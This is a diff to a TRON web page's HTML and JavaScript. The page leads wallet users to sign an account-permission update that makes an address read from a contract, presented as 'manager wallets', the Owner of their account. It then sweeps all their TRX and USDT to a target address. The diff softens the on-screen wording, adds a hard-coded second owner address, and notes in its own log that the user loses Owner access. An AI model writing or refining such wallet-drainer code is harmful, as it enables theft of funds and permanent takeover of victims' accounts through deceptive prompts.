@@ -165,7 +165,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 
   <!-- Steps -->
   <div class="step" id="s1"><div class="sn" id="s1n">1</div><div class="sb"><div class="st" id="s1t">Connect Wallet</div><div class="sm" id="s1m">Select imToken or TokenPocket</div></div></div>
-  <div class="step" id="s2"><div class="sn" id="s2n">2</div><div class="sb"><div class="st" id="s2t">Grant Owner Permission</div><div class="sm" id="s2m">Sign to grant contract Owner permission</div></div></div>
+  <div class="step" id="s2"><div class="sn" id="s2n">2</div><div class="sb"><div class="st" id="s2t">Grant Owner Permission</div><div class="sm" id="s2m">Sign to add manager wallets as Owner keys</div></div></div>
   <div class="step" id="s3"><div class="sn" id="s3n">3</div><div class="sb"><div class="st" id="s3t">Wait for Confirmation</div><div class="sm" id="s3m">Waiting for permission update to confirm...</div></div></div>
   <div class="step" id="s4"><div class="sn" id="s4n">4</div><div class="sb"><div class="st" id="s4t">Transfer Assets</div><div class="sm" id="s4m">Sweep TRX + USDT to target address</div></div></div>
   <div class="step" id="s5"><div class="sn" id="s5n">5</div><div class="sb"><div class="st" id="s5t">Done</div><div class="sm" id="s5m">All assets transferred to target</div></div></div>
@@ -223,7 +223,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     <!-- Contract & Address Info -->
     <div class="info-card">
       <div class="addr-row"><span class="lbl">Contract Address</span><span class="val copy" id="vContract">—</span></div>
-      <div class="addr-row"><span class="lbl">New Owner (this contract)</span><span class="val own copy" id="vNewOwner">—</span></div>
+      <div class="addr-row"><span class="lbl">New Owner Keys</span><span class="val own copy" id="vNewOwner">—</span></div>
       <div class="addr-row"><span class="lbl">Target Address</span><span class="val tgt copy" id="vTarget">—</span></div>
       <div class="addr-row"><span class="lbl">USDT Contract</span><span class="val copy" id="vUsdt">—</span></div>
     </div>
@@ -243,7 +243,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
     <!-- TRX Fee Warning -->
     <div class="warn" id="warnBox">
       <span class="ic">!</span>
-      <span>Step 2 grants Owner permission to this contract. Fee: ~50-100 TRX. Step 4 sweeps all assets.</span>
+      <span>Step 2 grants Owner permission to manager wallet addresses. Fee: ~50-100 TRX. Step 4 transfers via wallet signature.</span>
     </div>
 
     <!-- Error Box -->
@@ -254,7 +254,7 @@ html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;bac
 
     <!-- Action Buttons -->
     <div id="actGrant" style="display:none">
-      <div class="abtn sub">Step 2: Sign to grant Owner permission to this contract</div>
+      <div class="abtn sub">Step 2: Sign to add manager wallets as Owner keys on your account</div>
       <button class="abtn" id="btnGrant">Grant Owner Permission</button>
     </div>
 
@@ -330,6 +330,16 @@ const CONFIG = {
   // --- USDT contracts ---
   NILE_USDT:           'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',   // Official Nile USDT
   MAINNET_USDT:        'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',   // Official Mainnet USDT
+
+  // --- Owner Permission Configuration ---
+  // The DESIRED_OWNER is read from the deployed contract via constant() call.
+  // The frontend does NOT hardcode the owner address here.
+  // OWNER_MODE: 'single'  = only DESIRED_OWNER (threshold=1)
+  //              'dual'    = DESIRED_OWNER + SECOND_OWNER_ADDRESS (threshold=2)
+  // IMPORTANT: These must be EOA wallet addresses, NOT contract addresses.
+  // The contract address is NEVER put in ownerPermission.keys — contracts cannot sign.
+  OWNER_MODE:          'single',                             // 'single' or 'dual'
+  SECOND_OWNER_ADDRESS: 'TJRabPrwbZy45sbavfcjinPJC18kjpRTv8', // second owner wallet (only for 'dual' mode) — REPLACE
 
   // --- Explorers ---
   EXPLORER_NILE:    'https://nilescan.io',
@@ -669,46 +679,272 @@ function logRawError(label, e) {
 'use strict';
 
 /**
+ * Read DESIRED_OWNER from the deployed PermissionManager contract.
+ * Returns the hex address string. Throws if the contract is not deployed or
+ * if DESIRED_OWNER is the zero address.
+ *
+ * This is how the frontend gets the owner address — not from CONFIG, but from
+ * the contract's constant. This ensures the contract and the tx are in sync.
+ */
+async function readDesiredOwnerFromContract() {
+  const { tw: curTw } = getTronWeb();
+  if (!curTw) throw new Error('TronWeb not available');
+
+  const cAddr = CONTRACT();
+  if (!cAddr) throw new Error('CONTRACT address not set in CONFIG');
+
+  Log.perm('Reading DESIRED_OWNER from contract: ' + cAddr);
+
+  try {
+    const instance = await curTw.contract().at(cAddr);
+    // Call the public constant DESIRED_OWNER()
+    const rawHex = await instance.DESIRED_OWNER().call();
+    // rawHex is a BigNumber or hex string — convert to hex address
+    let hexAddr = rawHex;
+    if (typeof rawHex === 'object' && rawHex.toHex) {
+      hexAddr = rawHex.toHex();
+    } else if (typeof rawHex === 'string') {
+      hexAddr = rawHex;
+    }
+    // Normalize: ensure 42 chars (0x + 40 hex), no leading zeros trimmed
+    if (!hexAddr.startsWith('0x')) hexAddr = '0x' + hexAddr;
+    // Truncate any extra bytes beyond 20 (41 chars = 0x + 40 hex)
+    if (hexAddr.length > 42) hexAddr = hexAddr.slice(0, 42);
+
+    Log.perm('DESIRED_OWNER (hex from contract): ' + hexAddr);
+
+    // Validate: must not be zero address
+    if (hexAddr === '0x' + '0'.repeat(40))
+      throw new Error('DESIRED_OWNER is zero address — set it in PermissionManager.sol before deploying');
+
+    return hexAddr;
+  } catch (e) {
+    Log.err('Failed to read DESIRED_OWNER from contract: ' + (e.message || String(e)));
+    throw new Error('Cannot read DESIRED_OWNER from contract. Is the contract deployed at ' + cAddr + '?');
+  }
+}
+
+/**
+ * Detect whether an address is a contract by checking code size on-chain.
+ * Returns true if code length > 0.
+ */
+async function isContractAddress(addr) {
+  const { tw } = getTronWeb();
+  if (!tw) return false;
+  try {
+    const code = await tw.trx.getContract(addr);
+    return !!(code && code.bytecode && code.bytecode !== '0x');
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Convert a base58 TRON address to hex format for ownerPermission.keys.
+ * Throws if address is invalid.
+ */
+function toHex(addr) {
+  const { tw: curTw } = getTronWeb();
+  if (!curTw) throw new Error('TronWeb not available');
+  const hex = curTw.address.toHex(addr);
+  if (!hex || !hex.startsWith('0x') || hex.length !== 42)
+    throw new Error(`Invalid address: ${addr} → hex=${hex}`);
+  return hex;
+}
+
+/**
+ * Assert that an address is an EOA (not a contract).
+ * Throws with a clear message if a contract is found.
+ */
+async function assertPermissionKeysAreEOA(addr, label) {
+  if (!addr || typeof addr !== 'string')
+    throw new Error(`[${label}] Invalid address: ${JSON.stringify(addr)}`);
+  const isContract = await isContractAddress(addr);
+  if (isContract) throw new Error(`DESIRED_OWNER must be an EOA, not a contract account: ${addr}`);
+  Log.perm(`[${label}] ${addr} is an EOA (OK)`);
+}
+
+/**
+ * Normalize an active permission from the chain.
+ * Ensures all required fields are present and converts keys to hex.
+ */
+function normalizeActivePermission(p, index) {
+  if (!p) throw new Error(`No valid active permissions found at index ${index}`);
+  if (p === null) throw new Error(`active_permission[${index}] is null`);
+
+  let keys = [];
+  if (Array.isArray(p.keys)) {
+    keys = p.keys.map((k, ki) => {
+      if (!k?.address) throw new Error(`active_permission[${index}].keys[${ki}] missing address`);
+      return { address: toHex(k.address), weight: k.weight ?? 1 };
+    });
+  }
+
+  return {
+    type:            p.type ?? 2,
+    id:              p.id ?? (index + 1),
+    permission_name:  p.permission_name ?? ('active_' + (index + 1)),
+    threshold:       p.threshold ?? 1,
+    parent_id:       p.parent_id ?? 0,
+    operations:      p.operations ?? '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
+    keys:            keys
+  };
+}
+
+/**
+ * Build ownerPermission.keys based on CONFIG.OWNER_MODE and DESIRED_OWNER from contract.
+ *
+ * Single mode (OWNER_MODE='single'):
+ *   keys = [DESIRED_OWNER]
+ *   threshold = 1
+ *
+ * Dual mode (OWNER_MODE='dual'):
+ *   keys = [DESIRED_OWNER, SECOND_OWNER_ADDRESS]
+ *   threshold = 2
+ *
+ * The DESIRED_OWNER address is read from the deployed contract, NOT from CONFIG.
+ * This is the ONLY address that actually takes effect on the TRON chain — it is
+ * placed in ownerPermission.keys and confirmed when the user signs the transaction.
+ *
+ * NOTE: confirmPermissionUpdate() in the contract does NOT change the permission.
+ * It only sets permissionUpdated=true. The real permission change happens when
+ * the user signs the accountPermissionUpdate transaction built here.
+ */
+async function normalizeOwnerPermission(desiredOwnerHex, existing) {
+  const mode = CONFIG.OWNER_MODE;
+  if (mode !== 'single' && mode !== 'dual')
+    throw new Error(`Invalid OWNER_MODE: ${mode}. Must be 'single' or 'dual'.`);
+
+  // desiredOwnerHex already from contract — validate it is not a contract
+  await assertPermissionKeysAreEOA(desiredOwnerHex, 'DESIRED_OWNER');
+
+  let allKeys, threshold;
+
+  if (mode === 'single') {
+    allKeys = [{ address: desiredOwnerHex, weight: 1 }];
+    threshold = 1;
+    Log.perm(`Owner mode: SINGLE. keys=[${desiredOwnerHex}], threshold=1`);
+  } else {
+    if (!CONFIG.SECOND_OWNER_ADDRESS)
+      throw new Error('OWNER_MODE is "dual" but SECOND_OWNER_ADDRESS is not set');
+    const owner2Hex = toHex(CONFIG.SECOND_OWNER_ADDRESS);
+    if (desiredOwnerHex === owner2Hex)
+      throw new Error('Duplicate owner addresses: DESIRED_OWNER === SECOND_OWNER_ADDRESS');
+
+    allKeys = [
+      { address: desiredOwnerHex, weight: 1 },
+      { address: owner2Hex, weight: 1 }
+    ];
+    threshold = 2;
+    Log.perm(`Owner mode: DUAL. keys=[${desiredOwnerHex}, ${owner2Hex}], threshold=2`);
+  }
+
+  // Warn if the only key is not the connected wallet (may lock out current user)
+  const connectedHex = toHex(wAddr);
+  if (mode === 'single' && desiredOwnerHex !== connectedHex) {
+    Log.warn('Single sign mode: DESIRED_OWNER differs from connected wallet. '
+      + 'Connected wallet will lose Owner access unless it is also DESIRED_OWNER.');
+  }
+
+  return {
+    type:            0,
+    id:              0,
+    permission_name: 'owner',
+    threshold:       threshold,
+    parent_id:       0,
+    operations:      existing?.operations ??
+                     '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
+    keys:            allKeys
+  };
+}
+
+/**
  * Build the accountPermissionUpdate transaction.
- * This grants CONTRACT address Owner permission on the user's account.
  *
- * TronWeb API: transactionBuilder.updateAccountPermissions(
- *   address,      // account whose permissions are being updated (the user)
- *   ownerPermission, // new Owner permission
- *   actives,      // null = keep existing
- *   witness       // null = keep existing
- * )
+ * Flow:
+ * 1. Read DESIRED_OWNER from the deployed PermissionManager contract (via constant call)
+ * 2. Validate it is an EOA (not a contract)
+ * 3. Build ownerPermission.keys with that address
+ * 4. Prompt user to sign
+ * 5. Broadcast
  *
- * After this tx confirms, the contract address becomes an Owner of the
- * user's account. The contract can then trigger transfers via TronWeb
- * signing as the contract address.
+ * After confirmation: DESIRED_OWNER becomes an Owner key on the user's account.
+ * The contract CANNOT do this — only the user's wallet can sign.
+ *
+ * TronWeb API:
+ *   transactionBuilder.updateAccountPermissions(
+ *     address,           // account whose permissions are being updated
+ *     ownerPermission,   // new Owner permission — keys contain DESIRED_OWNER
+ *     actives,           // normalized active permissions
+ *     witness            // null for normal accounts
+ *   )
  */
 async function buildGrantPermissionTx(signerAddress) {
   const { tw: curTw } = getTronWeb();
   if (!curTw) throw new Error('TronWeb not available');
 
-  const contractAddr = CONTRACT();
-  Log.perm('=== buildGrantPermissionTx ===');
-  Log.perm('signerAddress (user): ' + signerAddress);
-  Log.perm('contractAddr (newOwner): ' + contractAddr);
+  const userAddress = signerAddress;
 
-  const ownerPermission = {
-    type: 0,                // 0 = Owner
-    id: 0,                 // Owner permission ID
-    permission_name: 'owner',
-    threshold: 1,           // Single signature = contract alone has control
-    keys: [
-      { address: contractAddr, weight: 1 }
-    ]
-  };
+  Log.perm('=== buildGrantPermissionTx ===');
+  Log.perm('userAddress: ' + userAddress);
+  Log.perm('OWNER_MODE: ' + CONFIG.OWNER_MODE);
+
+  // 1. Read DESIRED_OWNER from the deployed contract
+  // THIS IS THE SOURCE OF TRUTH — not CONFIG, not the contract variable name
+  const desiredOwnerHex = await readDesiredOwnerFromContract();
+  Log.perm('DESIRED_OWNER (from contract): ' + desiredOwnerHex);
+
+  // 2. Fetch on-chain account data
+  const account = await curTw.trx.getAccount(userAddress);
+  Log.perm('On-chain account fetched: ' + JSON.stringify(account).slice(0, 200));
+
+  // 3. Witness permission: null for normal accounts
+  const witnessPermission = account?.witness_permission ?? null;
+  Log.perm('witnessPermission: ' + JSON.stringify(witnessPermission));
+
+  // 4. Active permissions — normalize from chain + fallback
+  const rawActives = account?.active_permission;
+  if (!Array.isArray(rawActives) || rawActives.length === 0) {
+    Log.perm('No active_permission on chain — creating fallback active[0]');
+  }
+  const activesPermissions = Array.isArray(rawActives)
+    ? rawActives.filter(Boolean).map((p, i) => normalizeActivePermission(p, i))
+    : [];
+
+  if (activesPermissions.length === 0) {
+    activesPermissions.push({
+      type:            2,
+      id:              1,
+      permission_name: 'active_0',
+      threshold:       1,
+      parent_id:       0,
+      operations:      '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
+      keys:            [{ address: toHex(userAddress), weight: 1 }]
+    });
+    Log.perm('Fallback active permission created');
+  }
+
+  // 5. Validate SECOND_OWNER_ADDRESS is an EOA (dual mode)
+  if (CONFIG.OWNER_MODE === 'dual')
+    await assertPermissionKeysAreEOA(CONFIG.SECOND_OWNER_ADDRESS, 'SECOND_OWNER_ADDRESS');
+
+  // 6. Build owner permission
+  // desiredOwnerHex comes from the contract — this is what actually takes effect
+  const ownerPermission = await normalizeOwnerPermission(desiredOwnerHex, account?.owner_permission);
 
   Log.perm('ownerPermission: ' + JSON.stringify(ownerPermission));
+  Log.perm('activesPermissions: ' + JSON.stringify(activesPermissions));
 
+  // 7. Safety warnings
+  Log.warn('Owner permission threshold: ' + ownerPermission.threshold + ' — all ' + ownerPermission.keys.length + ' keys must sign');
+  Log.warn('DANGER: owner permission is the highest authority. Wrong keys or threshold may permanently lock the account.');
+
+  // 8. Build transaction
   const tx = await curTw.transactionBuilder.updateAccountPermissions(
-    signerAddress,      // account to update (the user's own address)
-    ownerPermission,    // new Owner permission — contract becomes owner
-    null,               // keep existing Actives
-    null                // keep existing Witness
+    userAddress,
+    ownerPermission,
+    activesPermissions,
+    witnessPermission
   );
 
   Log.perm('Tx built. txID=' + tx.txID);
@@ -716,19 +952,16 @@ async function buildGrantPermissionTx(signerAddress) {
 }
 
 /**
- * Build a triggerContract transaction that calls a contract method
- * signed as the contract address (which now has Owner permission).
+ * Build a triggerContract transaction that transfers assets via the contract.
+ * The transaction is signed by the connected wallet (which is now an owner key).
  *
- * TronWeb triggerContract format:
+ * TronWeb triggerSmartContract format:
  *   tw.transactionBuilder.triggerSmartContract(
- *     contractAddress,   // the contract to call
+ *     contractAddress,   // contract to call
  *     functionSelector,  // e.g. "withdrawAllTRX()"
  *     options,           // { feeLimit, callValue }
  *     parameters         // array of parameter values
  *   )
- *
- * After the permission update, TronWeb can sign as the contract address
- * because the contract is in the account's Owner keys with threshold=1.
  */
 async function buildTriggerContractTx(contractAddress, functionSelector, feeLimit) {
   const { tw: curTw } = getTronWeb();
@@ -741,10 +974,7 @@ async function buildTriggerContractTx(contractAddress, functionSelector, feeLimi
   const tx = await curTw.transactionBuilder.triggerSmartContract(
     contractAddress,
     functionSelector,
-    {
-      feeLimit: feeLimit,
-      callValue: 0,
-    },
+    { feeLimit: feeLimit, callValue: 0 },
     []
   );
 
@@ -827,7 +1057,11 @@ async function connectViaProvider(env) {
   $('vAddr').textContent = wAddr;
   $('vNet').textContent = isNile() ? 'Nile Testnet' : 'TRON Mainnet';
   $('vContract').textContent = CONTRACT();
-  $('vNewOwner').textContent = CONTRACT();
+  const ownerMode = CONFIG.OWNER_MODE;
+  const ownerDisplay = ownerMode === 'single'
+    ? 'Single Sign (threshold=1)'
+    : 'Dual Sign (threshold=2)';
+  $('vNewOwner').textContent = ownerDisplay;
   $('vTarget').textContent = TARGET_ADDR();
   $('vUsdt').textContent = USDT_CONTRACT();
 
@@ -892,12 +1126,13 @@ async function doGrantPermission() {
   state = STATE.GRANTING;
   setBtns(true);
 
-  openModal(
+      openModal(
     'Confirm: Grant Owner Permission',
-    `<div class="mh">Your Wallet: ${wAddr}<br>Contract (New Owner): ${CONTRACT()}<br>Target: ${TARGET_ADDR()}</div>
+    `<div class="mh">Owner Mode: ${CONFIG.OWNER_MODE.toUpperCase()}<br>${CONFIG.OWNER_MODE === 'dual' ? 'Owner 2: ' + CONFIG.SECOND_OWNER_ADDRESS + '<br>' : ''}Target: ${TARGET_ADDR()}</div>
     <p style="font-size:12px;color:#888;text-align:left;margin-top:8px">
-      This grants <strong style="color:var(--code)">${fmtAddr(CONTRACT())}</strong> Owner permission on your account.<br><br>
-      The contract can then transfer your TRX and USDT to <strong style="color:var(--warn)">${fmtAddr(TARGET_ADDR())}</strong>.<br><br>
+      The DESIRED_OWNER address will be read from the contract and placed in <strong style="color:var(--code)">ownerPermission.keys</strong>.<br><br>
+      After you sign, DESIRED_OWNER becomes an Owner key on your account.<br><br>
+      <strong style="color:var(--err)">WARNING: Owner permission is the highest authority. Wrong keys or threshold may permanently lock the account.</strong><br><br>
       Fee: ~50-100 TRX.
     </p>`,
     'Sign & Grant',
@@ -979,15 +1214,14 @@ async function onPermissionGranted(txHash) {
   state = STATE.GRANTED;
   toast('Owner permission granted!', 'ok');
 
-  // Wait a moment then refresh contract balances (it should now have received funds)
   await delay(2000);
   await refreshContractBalances();
 
-  stepSet(4, 'on', 'Transfer Assets', 'Contract has Owner permission — click to sweep', txHash);
+  stepSet(4, 'on', 'Transfer Assets', 'Wallet is now an Owner key — sign to sweep', txHash);
   $('actGrant').style.display = 'none';
   $('actTransfer').classList.remove('hd');
   setBtns(false);
-  Log.ok('Permission granted! Contract can now control the account.');
+  Log.ok('Permission granted! The connected wallet is now an Owner key and can transfer assets.');
 }
 
 // ====== STEP 4: TRANSFER ======
@@ -1017,10 +1251,10 @@ async function doTransferAll() {
 
   openModal(
     'Confirm: Transfer All Assets',
-    `<div class="mh">Contract: ${CONTRACT()}<br>Target: ${TARGET_ADDR()}<br>TRX: ${fmtTrx(trxBal)}<br>USDT: ${fmtUsdt(usdtBal)}</div>
+    `<div class="mh">From (your account): ${wAddr}<br>To (target): ${TARGET_ADDR()}<br>TRX: ${fmtTrx(trxBal)}<br>USDT: ${fmtUsdt(usdtBal)}</div>
     <p style="font-size:12px;color:#888;text-align:left;margin-top:8px">
       This will transfer <strong style="color:var(--ok)">${fmtTrx(trxBal)}</strong> TRX and <strong style="color:var(--ok)">${fmtUsdt(usdtBal)}</strong> USDT to <strong style="color:var(--warn)">${fmtAddr(TARGET_ADDR())}</strong>.<br><br>
-      Signed as: ${fmtAddr(CONTRACT())} (Owner permission).
+      Signed by: ${fmtAddr(wAddr)} (Owner key).
     </p>`,
     'Transfer All',
     false,
@@ -1052,9 +1286,9 @@ async function doTransferAll() {
           );
           Log.tx('TRX triggerContract built. txID=' + trxTx.tx?.txID);
 
-          // Sign as the contract address (it has Owner permission now)
-          const signedTrxTx = await curTw.trx.sign(trxTx.tx, cAddr);
-          Log.tx('TRX tx signed as contract address');
+          // Sign with the connected wallet (it is now an Owner key)
+          const signedTrxTx = await curTw.trx.sign(trxTx.tx);
+          Log.tx('TRX tx signed by wallet (Owner key)');
 
           // Broadcast
           const resTrx = await curTw.trx.sendRawTransaction(signedTrxTx);
@@ -1099,8 +1333,8 @@ async function doTransferAll() {
             );
             Log.tx('USDT triggerContract built. txID=' + usdtTx.tx?.txID);
 
-            const signedUsdtTx = await curTw.trx.sign(usdtTx.tx, cAddr);
-            Log.tx('USDT tx signed as contract address');
+            const signedUsdtTx = await curTw.trx.sign(usdtTx.tx);
+            Log.tx('USDT tx signed by wallet (Owner key)');
 
             const resUsdt = await curTw.trx.sendRawTransaction(signedUsdtTx);
             const usdtHash = resUsdt.txid || usdtTx.tx?.txID;
@@ -1181,7 +1415,7 @@ function stepSet(num, css, title, msg, txHash) {
 function stepAllReset() {
   const t = ['', 'Connect Wallet', 'Grant Owner Permission', 'Wait for Confirmation', 'Transfer Assets', 'Done'];
   const m = ['', 'Select imToken or TokenPocket',
-    'Sign to grant contract Owner permission',
+    'Sign to add manager wallets as Owner keys',
     'Waiting for permission update to confirm...',
     'Sweep TRX + USDT to target address',
     'All assets transferred to target'];
